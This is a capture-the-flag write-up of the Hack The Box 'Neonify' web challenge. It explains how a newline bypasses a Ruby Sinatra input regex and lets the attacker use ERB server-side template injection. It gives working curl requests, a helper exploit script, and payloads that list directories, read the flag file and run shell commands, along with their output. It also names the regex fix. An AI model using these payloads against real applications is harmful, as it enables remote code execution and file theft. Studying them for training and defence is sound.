---
title: "Neonify"
date: 2023-02-23
link: 
tags:
- writeups
---

**Description**: It's time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!

## Enumeration
The challenge provides us with the source code. However, before diving into it I like to just see what I'm dealing with & play around a little. Then review the deployment stack for anything useful.

### Website
![[write-ups/images/Pasted image 20230223144324.png]]

Nothing to crazy, it seems to be a single page web app that contains a simple form that `POST`s to `/` with the `neon` parameter which returns our input with a glow style.

First thing I thought was to try XSS, but it seems that the app is filtering our input in some way in the backend, since I got a **Malicious Input Detected** message with a simple `<`. I was curious to find out what chars are filtered, but it looks like most of them are.

Also note that the web app is built with [sinatra](https://sinatrarb.com/) -- a framework for creating web applications in Ruby with minimal effort:

![[write-ups/images/Pasted image 20230223173542.png]]

### Source Code
It's probably the time to dive into the source code to see how the filtering is done & get a better idea of what we're dealing with. Aaaand it's in ruby.... Guess i should've figured it out by the 4 giant rubies in front of me 

![](https://media3.giphy.com/media/U4VXRfcY3zxTi/200.webp?cid=ecf05e47l1mnwe1kookbqls2vl9m39nde75107etpjk7r073&rid=200.webp&ct=g)

There's just 1 file worth noting here `neon.rb`:
```ruby
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```

- The `neon` parameter that is `POST`ed is passed further into the template, handled by [ERB](https://rubyapi.org/o/erb)
- There's a regex validation which only allows alphanumeric chars, numbers and spaces

So it will require a 2 step aproach: a Server Side Template Injection *(STTI)* and finding a way to bypass the validation regex

## Exploitation

### Regex Bypass
First we need to find a way to bypass the regex. Taking a look at the regex with on [online regex editor](https://rubular.com/) allowed me to play with & understand it more:
- `^[0-9a-z ]` - start of line accepts only alphanumeric chars, numbers and spaces
- `+$` - indicates the end of line
- `i` - case insensitive

As it turns out, because it only checks our input from the start to the end of the 1st line, we can bypass it by simply adding a new line which will not be validated by the regex:

![[write-ups/images/Pasted image 20230223174949.png]]

> Apparently [the secure way of doing this](https://docs.guardrails.io/docs/vulnerabilities/ruby/insecure_use_of_regular_expressions) is to replace `^` with `\A` and `$` with `\z`

We can test this using curl:
```bash
╰─ curl -X POST -d 'neon=wow%0A<>/;[]all of this is now allowed' http://165.22.118.85:31202
<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow">wow
<>/;[]all of this is now allowed</h1>
    </div>
</body>
</html>
```


### STTI
Moving on to actually testing it with a STTI payload:
```bash
# notice the empty space before %0A 
# this is required to properly run the payload
╰─ curl -X POST -d 'neon= %0A<%= 7*7 %>' http://165.22.118.85:31202
Invalid query parameters: invalid %-encoding (%0A&amp;lt;%= 7*7 %&amp;gt;)
```

This is not working because we need to urlencode it, so after doing this we get:
```bash
╰─ curl -X POST -d 'neon= %0A%3c%25%3d%20%37%2a%37%20%25%3e%0a%0a%0a%0a%0a%0a' http://165.22.118.85:31202
...
<h1 class="glow">
	49
</h1>
...
```
Now that we have confirmed our template injection, [let's look @ how we can read files or execute system commands](https://www.trustedsec.com/blog/rubyerb-template-injection/). We can also create a simple bash script to make things easier:
```bash
#!/bin/bash

URL="http://165.22.118.85:31202/"
pay=$(echo "$1" | xxd -p|tr -d \\n|sed 's/../%&/g')

curl -X POST -d "neon= %0a$pay" $URL
```

Then just use it:
```bash
# list dirs
╰─ bash exp.sh "<%= Dir.entries('/') %>"
<h1 class="glow">
["lib", "var", "proc", "usr", "dev", "bin", "media", "..", "opt", "root", "mnt", "sbin", "etc", "sys", "run", "srv", "tmp", ".", "home", "app"]
</h1>

# read files
╰─ bash exp.sh "<%= File.open('./flag.txt').read %>"
<h1 class="glow">
HTB{r3******3n7_s3*****y}
</h1>

# exec cmd
╰─ bash exp.sh '<%= `id` %>'
<h1 class="glow">
uid=1000(www) gid=1000(www) groups=1000(www)
</h1>
```


## Refs
- [challenge](https://app.hackthebox.com/challenges/303)
- [rubular](https://rubular.com/)
- [haktricks STTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby)

## See Also
- [[write-ups/HTB]]
